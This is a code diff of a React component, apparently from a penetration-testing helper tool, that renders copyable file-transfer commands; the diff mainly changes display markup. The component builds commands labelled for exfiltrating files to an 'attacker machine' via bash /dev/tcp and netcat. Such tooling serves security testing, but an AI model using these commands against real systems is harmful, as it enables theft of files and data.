@@ -20,12 +20,8 @@ export default function FileTransfer () {
     const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
         setValues( { ...values, [ name ]: event.target.value } );
     };
-    const bash_transfer = `
-    bash -c 'echo -e "POST / HTTP/0.9\n\n$(<${ values.file_name })" > /dev/tcp/${ values.ip }/${ values.port }'
-    `;
-    const bash_tcp_transfer = ` 
-    bash -c 'cat ${ values.file_name } > /dev/tcp/${ values.ip }/${ values.port }'
-    `;
+    const bash_transfer = `bash -c 'echo -e "POST / HTTP/0.9 $(<${ values.file_name })" > /dev/tcp/${ values.ip }/${ values.port }'`;
+    const bash_tcp_transfer = `bash -c 'cat ${ values.file_name } > /dev/tcp/${ values.ip }/${ values.port }'`;
     const bash_download = `bash -c 'cat < /dev/tcp/${ values.ip }/${ values.port } > ${ values.file_name }'`;
     const netcat_transfer = `nc ${ values.ip } ${ values.port } < ${ values.file_name }`;
     const python_server = `python3 -m http.server ${ values.port }`;
@@ -81,8 +77,8 @@ export default function FileTransfer () {
                     Bash Upload <IconFont type='icon-gnubash' />
                 </Title>
                 <Text strong># Upload file over HTTP (require HTTP service running on the attacker machine)</Text>
-                <Paragraph copyable code editable ellipsis={true}>
-                    {bash_transfer}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>{bash_transfer}</Text></pre>
                 </Paragraph>
                 <Text strong style={{ marginTop: '1em' }}>
                     # Exfiltrate file over TCP
@@ -93,19 +89,19 @@ export default function FileTransfer () {
                 <Paragraph copyable>
                     nc -l -p {values.port} {'>'} data
                 </Paragraph>
-                <Paragraph copyable code editable ellipsis={true}>
-                    {bash_tcp_transfer}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>{bash_tcp_transfer}</Text></pre>
                 </Paragraph>
                 <Title level={3}>
                     Bash Download <IconFont type='icon-gnubash' />
                 </Title>
                 <Text strong># Send via netcat</Text>
-                <Paragraph copyable code editable ellipsis={true}>
-                    nc -l -p {values.port} {'<'} {values.file_name}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>nc -l -p {values.port} {'<'} {values.file_name}</Text></pre>
                 </Paragraph>
                 <Text strong># Download file on the other machine</Text>
-                <Paragraph copyable code editable ellipsis={true}>
-                    {bash_download}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>{bash_download}</Text></pre>
                 </Paragraph>
             </div>
             <Divider dashed />
@@ -114,18 +110,18 @@ export default function FileTransfer () {
                     Netcat <IconFont type='icon-command-line' />
                 </Title>
                 <Text strong># Upload payload</Text>
-                <Paragraph copyable code editable ellipsis={true}>
-                    nc -lnvp ; {values.port}
-                    {netcat_transfer}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>nc -lnvp ; {values.port}
+                        {netcat_transfer}</Text></pre>
                 </Paragraph>
                 <Text strong style={{ marginTop: '2em' }}>
                     # Download
                 </Text>
-                <Paragraph copyable code editable ellipsis>
-                    nc {values.ip} {values.port} {'<'} {values.file_name}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>nc {values.ip} {values.port} {'<'} {values.file_name}</Text></pre>
                 </Paragraph>
-                <Paragraph copyable code editable ellipsis>
-                    nc -lnvp {values.port} {'>'} file_saved
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>nc -lnvp {values.port} {'>'} file_saved</Text></pre>
                 </Paragraph>
             </div>
             <Divider dashed />
@@ -140,12 +136,12 @@ export default function FileTransfer () {
                     Python <IconFont type='icon-python' />
                 </Title>
                 <Text strong># Python3 HTTP Server</Text>
-                <Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
-                    {python_server}
+                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
+                    <pre><Text copyable>{python_server}</Text></pre>
                 </Paragraph>
                 <Text strong># Python2 HTTP Server</Text>
-                <Paragraph copyable code editable ellipsis>
-                    {python2_server}
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>{python2_server}</Text></pre>
                 </Paragraph>
             </div>
             <Divider dashed />
@@ -160,12 +156,12 @@ export default function FileTransfer () {
                     SCP <IconFont type='icon-filelock' />
                 </Title>
                 <Text strong># Upload from local host to remote computer</Text>
-                <Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
-                    {scp}
+                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
+                    <pre><Text copyable>{scp}</Text></pre>
                 </Paragraph>
                 <Text strong># Download from remote computer</Text>
-                <Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
-                    {scp_dl}
+                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
+                    <pre><Text copyable>{scp_dl}</Text></pre>
                 </Paragraph>
             </div>
         </QueueAnim>
